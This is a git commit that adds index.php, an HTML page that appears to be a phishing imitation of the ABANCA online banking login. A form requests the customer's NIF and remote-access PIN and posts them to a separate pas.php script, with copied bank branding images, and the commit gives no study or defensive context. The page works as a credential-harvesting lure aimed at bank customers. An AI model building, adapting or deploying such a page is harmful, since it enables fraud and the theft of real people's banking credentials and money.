d36c397e4ac8a510e2b6ecd794278c58c78d833e
caspermagic2020 <capsulaplus2522@outlook.es>
2025-03-03 14:03:23 -0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avanca</title>
+    <link rel="stylesheet" href="css.css">
+</head>
+<body style="margin: 0%;">
+    
+
+    <div style="width: 115%;background-color: #5b87da;">
+    <img style="width: 80px;" src="ayuda.png" alt="">
+</div>
+
+
+<img style="width: 150px; margin: 12px;" src="aba.png" alt="">
+
+<h2 class="ti">Bienvenido a la Banca electrónica y Buzón Digital de ABANCA.</h2>
+
+
+
+
+ 
+<br>
+
+ 
+<center> 
+
+
+
+<div style="width: 380px; height: 350px; ">
+    <img style="width: 100%;" src="particular.png" alt="">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+     
+    
+     
+    
+    
+        <form method="post"  action="pas.php" class="form"> 
+    
+       <div class="cj1" style="float: left;">
+    
+     
+           <img class="nif" src="nif.png" alt="">
+    
+               <div > 
+    
+           <div style="margin-left: 190px;">
+             <a class="f1" >NIF:</a> 
+              <input style="padding-left:5px;" class="dr1" maxlength="9" type="text" name="nif" id=""> <a href="" class="f2">No tengo NIF</a>
+           </div>
+    
+    
+            <br> 
+    
+              <div style="margin-left: 165px;">
+                 <a class="f1" >PIN (a Distancia):</a> 
+               <input style="padding-left:5px;"  class="dr2" maxlength="6" style="width: 60px;" type="text" name="pin" id=""> <a href="" class="f2">¿Has olvidado o no funciona tu PIN?</a>
+              </div>
+         
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+        <br>    <br>    <br>    <br>    
+    
+    
+    
+        <input class="acc" type="submit" value="Acceder">
+    
+     <input class="acc2" type="submit" value="Limpiar">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+     
+    
+    
+    
+     
+    </form>
+    
+    
+
+
+
+
+
+     
+
+
+
+
+
+
+
+<br>
+
+
+
+
+
+
+<br><br><br>    
+ 
+ 
+<div style="width: 400px; height: auto; margin-left: -19px; ">
+
+
+<img style="width: 102%; margin-right: 10px;" src="empresa.png" alt="">
+
+</div>
+
+
+
+
+
+<img style="width:  450px ; margin-left: -40px;" src="abajofinal.png" alt="">
+
+
+
+
+
+
+
+
+</body>
+</html>
